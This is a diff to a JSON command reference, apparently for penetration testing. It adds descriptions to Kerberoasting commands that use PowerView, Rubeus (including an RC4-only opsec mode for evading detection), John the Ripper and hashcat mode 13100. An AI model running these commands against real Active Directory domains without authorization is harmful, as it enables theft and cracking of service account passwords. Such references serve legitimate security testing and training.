@@ -221,23 +221,28 @@
   "variations": [
     {
       "label": "PowerView/Empire Invoke-Kerberoast",
-      "command": "Invoke-Kerberoast -Identity <user> -Domain <domain> | fl"
+      "command": "Invoke-Kerberoast -Identity <user> -Domain <domain> | fl",
+      "description": "Uses PowerView to request Kerberos service tickets for all accounts with SPNs set, then outputs the ticket hashes in a format ready for offline password cracking with Hashcat or John."
     },
     {
       "label": "Crack hashes offline with John",
-      "command": "john.exe --wordlist=<wordlist> <hashfile>"
+      "command": "john.exe --wordlist=<wordlist> <hashfile>",
+      "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
     },
     {
       "label": "Crack with hashcat (TGS-REP m13100 / AS-REP m18200)",
-      "command": "hashcat -m 13100 <hashfile> <wordlist>"
+      "command": "hashcat -m 13100 <hashfile> <wordlist>",
+      "description": "Cracks Kerberoasted TGS-REP hashes (hashcat mode 13100). Takes the service ticket hash output from Kerberoasting tools and brute-forces the service account password."
     },
     {
       "label": "Rubeus - stats then RC4-only (opsec)",
-      "command": "Rubeus.exe kerberoast /stats\nRubeus.exe kerberoast /rc4opsec /outfile:hashes.txt"
+      "command": "Rubeus.exe kerberoast /stats\nRubeus.exe kerberoast /rc4opsec /outfile:hashes.txt",
+      "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
     },
     {
       "label": "Rubeus - simple output",
-      "command": "Rubeus.exe kerberoast /simple /outfile:hashes.txt"
+      "command": "Rubeus.exe kerberoast /simple /outfile:hashes.txt",
+      "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
     }
   ],
   "explain": "Requests TGS tickets for every account that has an SPN, for offline cracking:\n  kerberoast               roast all SPN accounts (add /user:<user> to target one, /stats to just list)\n  /rc4opsec                only roast accounts that support RC4, avoiding noisy AES-downgrade requests\n  /nowrap                  single-line hash output\n  /outfile:hashes.txt      save the hashes\nCrack offline with hashcat -m 13100 to recover the service account passwords."
